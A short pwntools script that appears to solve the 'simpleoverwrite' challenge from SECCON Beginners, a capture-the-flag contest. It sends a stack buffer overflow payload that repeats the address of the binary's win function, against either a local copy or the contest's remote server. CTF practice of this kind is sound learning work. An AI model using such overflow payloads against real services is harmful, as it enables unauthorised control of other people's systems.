from pwn import *

exe = ELF("./chall")
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(
        exe.path,
        """
        b *main
        continue
    """,
    )
elif args.REMOTE:
    # nc simpleoverwrite.beginners.seccon.games 9001
    io = remote("simpleoverwrite.beginners.seccon.games", 9001)

io.sendline(b'AA' + pack(exe.symbols.win) * 100)
io.interactive()
